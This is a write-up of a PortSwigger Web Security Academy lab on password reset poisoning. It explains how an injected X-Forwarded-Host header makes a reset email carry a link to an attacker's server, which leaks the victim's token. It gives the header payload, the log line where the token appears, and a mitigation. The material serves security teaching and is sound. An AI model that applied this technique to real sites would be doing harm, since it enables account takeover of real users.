# Password reset poisoning via middleware
---
## TARGET
PortSwigger Web Security Academy  
Lab: _Password reset poisoning via middleware_
Vulnerability: _Authentication Vulnerability_

---
## DESCRIPTION
The application is vulnerable to password reset poisoning due to a logic flaw in its password reset workflow. By injecting a malicious HTTP header, an attacker forces the application to send a poisoned link to a targeted user. When the user interacts with the email, their secret token is sent to the attackers server.

---
## ROOT CAUSE
The backend server relies on the middleware's `X-Forwarded-Host` header to determine the host domain. The server performs Dynamic Generation of the password reset URL upon the user request. However the back end does not verify if the header is legitimate or not. Because of the implicit trust between the back end and the header, this application becomes vulnerable to password reset poisoning.

---
## ATTACK SCENARIO
1. Intercepts the legitimate password reset POST request for the victim(carlos).
2. Performs Header Poisoning via injecting the malicious `X-Forwarded-Host` header pointing to the attacker's server.
3. Forwards the manipulated request, causing the server to email the poisoned link to the victim.
4. Captures the Out of Band Extraction of the token in the servers logs when the victim clicks the link.
5. Extracts the token and executes the password reset to compromise the account.

---
## PROOF OF CONCEPT
**Target Endpoint:** `POST /forgot-password`
**Injected Payload:** `X-Forwarded-Host: exploit-[LAB-ID].exploit-server.net`
**Data Retrieval Point:** The HTTP Access Logs on the exploit server (capturing the `GET /forgot-password?temp-forgot-password-token=[TOKEN]` request ).

---
## IMPACT
This allows an attacker to hijack the password reset process, leading to a complete unauthorized account takeover without needing the victim's current password.

---
## FIX / MITIGATION
The server must stop relying on incoming HTTP headers to build sensitive links and the development team needs to hardcode the application domain name directly into the server's configuration file. If the header usage is strictly required, proper server-side validation must be performed.

---
## KEY LEARNING
Never trust user-controllable input or HTTP headers when generating sensitive system URLs.

---
